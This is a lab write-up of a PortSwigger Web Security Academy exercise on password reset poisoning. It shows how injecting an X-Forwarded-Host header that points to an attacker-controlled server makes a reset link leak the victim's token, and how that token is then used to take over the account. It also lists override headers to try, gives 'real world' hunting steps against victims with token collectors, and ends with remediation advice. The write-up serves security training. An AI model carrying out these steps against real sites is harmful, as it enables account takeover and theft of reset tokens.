# Password Reset Poisoning via Middleware

**Platform:** PortSwigger Web Security Academy  
**Category:** Authentication  
**Difficulty:** Practitioner  
**Date Solved:** 2026-09-17  
**Severity:** High

## Summary

The application builds password reset links using the `X-Forwarded-Host` header — a non-standard header trusted by the middleware layer. By intercepting the forgot-password request and injecting a malicious `X-Forwarded-Host` value pointing to an attacker-controlled server, the reset link in Carlos's email points to the attacker's server instead of the real site. When Carlos clicks the link, his reset token is exfiltrated in the access log. The attacker then uses that token on the real site to reset Carlos's password and gain full account access.

## Affected Component

`POST /forgot-password` — builds reset URL from `X-Forwarded-Host` header without validation. Middleware trusts this header blindly.

## Root Cause

```
Normal flow:
POST /forgot-password
Host: target.com
→ Email: https://target.com/forgot-password?token=abc123

Poisoned flow:
POST /forgot-password
Host: target.com
X-Forwarded-Host: exploit-server.net     ← attacker-controlled
→ Email: https://exploit-server.net/forgot-password?token=abc123
→ Victim clicks → token lands on attacker's server
→ Attacker uses token on real site → resets password
```

The server uses `X-Forwarded-Host` (set by proxies/middleware) to construct the reset URL, trusting it without validating that it matches the legitimate domain.

## Steps to Reproduce

1. Go to `/forgot-password` → enter `carlos` as username
2. Intercept the POST request in Burp
3. Add header:
```
X-Forwarded-Host: YOUR-EXPLOIT-SERVER.net
```
4. Forward the request
5. Go to exploit server → Access log → wait 10-15 seconds
6. Find Carlos's request — **how to locate the token:**

### Finding the token in the access log

```
Method 1: Ctrl+F → search "token"
Method 2: Ctrl+F → search "Victim" → find the line with victim user-agent
Method 3: Look for the line from a different IP (victim's browser IP vs your IP)
```

The token appears in a GET request like:
```
10.0.4.171 "GET /forgot-password?temp-forgot-password-token=vpu9feocrx06za54tpp9p4ssw08ep4to"
           user-agent: Mozilla/5.0 (Victim)
```

7. Copy the token value
8. Use token on the **real site** using this URL format:

### URL format for future hunting

```
https://TARGET-SITE.com/RESET-ENDPOINT?TOKEN-PARAM=TOKEN-VALUE
```

Example from this lab:
```
https://0a90002a04b1ab2b80f1176900b9003b.web-security-academy.net/forgot-password?temp-forgot-password-token=vpu9feocrx06za54tpp9p4ssw08ep4to
```

**Three parts to always identify:**
```
1. TARGET-SITE     → the real target URL (NOT your exploit server)
2. RESET-ENDPOINT  → copy from normal reset flow (e.g. /forgot-password, /reset, /password-reset)
3. TOKEN-PARAM     → copy exact parameter name from log (varies per app):
                     ?token=
                     ?temp-forgot-password-token=
                     ?reset_token=
                     ?key=
                     ?code=
                     ?t=
```

Never guess the parameter name — always copy it directly from the log line.

9. Navigate to the URL → set new password for carlos → login → lab solved 

## Proof of Concept

**Access log entry (victim):**
```
10.0.4.171 2026-09-17 06:51:27 +0000
"GET /forgot-password?temp-forgot-password-token=vpu9feocrx06za54tpp9p4ssw08ep4to"
user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36
```

**Token used on real site:**
```
https://TARGET.web-security-academy.net/forgot-password?temp-forgot-password-token=vpu9feocrx06za54tpp9p4ssw08ep4to
```

## Headers to Try (Real Hunting)

Not all apps use `X-Forwarded-Host`. Try all of these:

```
X-Forwarded-Host: YOUR-SERVER
X-Forwarded-For: YOUR-SERVER
X-Host: YOUR-SERVER
X-Forwarded-Server: YOUR-SERVER
X-HTTP-Host-Override: YOUR-SERVER
Forwarded: host=YOUR-SERVER
```

If one works — the server uses it to build the reset URL.

<img width="1919" height="817" alt="image" src="https://github.com/user-attachments/assets/f11e9a16-d699-414f-9719-652a7bc815e0" />

## Real World Application

```
1. Go to /forgot-password → enter YOUR OWN email (test account)
2. Intercept with Burp → add X-Forwarded-Host: YOUR-SERVER → forward
3. Check your email — does the reset link contain your server? → VULNERABLE
4. Now do the same for victim username
5. Wait for victim to click → grab token from log → use on real site
```

**Where to host your collector (real hunting):**
```
Burp Collaborator   → Burp Pro built-in (best)
webhook.site        → free, instant, no setup
your own VPS        → python3 -m http.server 80
```

**Token expiry — act fast:**
Most reset tokens expire in 15-60 minutes. Once you see it in the log — use it immediately.

---

## Impact

### Technical
- Full ATO on any account whose email the server sends a reset link to
- No victim interaction beyond clicking a normal-looking email link
- Token captured silently — victim sees a broken link, no warning
- Works on any account including admin

### Business / Real-World
- Password reset is supposed to be the account recovery safety net
- This turns it into an attack vector
- Admin account reset = full platform compromise
- In production: mass ATO possible if attacker automates for all usernames

---

## Remediation

1. **Never trust X-Forwarded-Host for URL construction** — use a hardcoded base URL from server config
2. **Validate Host header** against a whitelist of allowed domains
3. **Configure middleware correctly** — only trust X-Forwarded-Host from known proxy IPs
4. **Short token expiry** — 15 minutes maximum
5. **Single-use tokens** — invalidate immediately after use

---

## Lessons Learned

- Non-standard headers (`X-Forwarded-Host`, `X-Host`) are attack surface — always test them on reset flows
- The token is always in the GET request in the access log — Ctrl+F "token" or "Victim"
- URL format: real-target.com + reset-endpoint + exact-param-name=TOKEN
- Token parameter name varies — copy from log, never guess
- Act fast — tokens expire, usually within 15-60 minutes

---

## Methodology Entry

```
### Password Reset Poisoning
WHERE:  forgot-password form → intercept → try X-Forwarded-Host header
WHAT:   add X-Forwarded-Host: YOUR-SERVER → submit for victim username
        → victim clicks email → Ctrl+F "token" in access log
        → use: real-target.com/reset-endpoint?exact-param=TOKEN
SIGNAL: victim IP hits your server with token in GET request
HEADERS TO TRY: X-Forwarded-Host, X-Host, X-Forwarded-Server, Forwarded
ACT FAST: tokens expire in 15-60 mins
```

---

## References

- [PortSwigger Lab](https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning/lab-host-header-password-reset-poisoning-middleware)
- [PortSwigger — Host header attacks](https://portswigger.net/web-security/host-header)
- [PortSwigger — Password reset poisoning](https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning)

---

**Tags:** `#PortSwigger` `#Authentication` `#PasswordReset` `#HostHeader` `#XForwardedHost` `#Middleware` `#Practitioner`
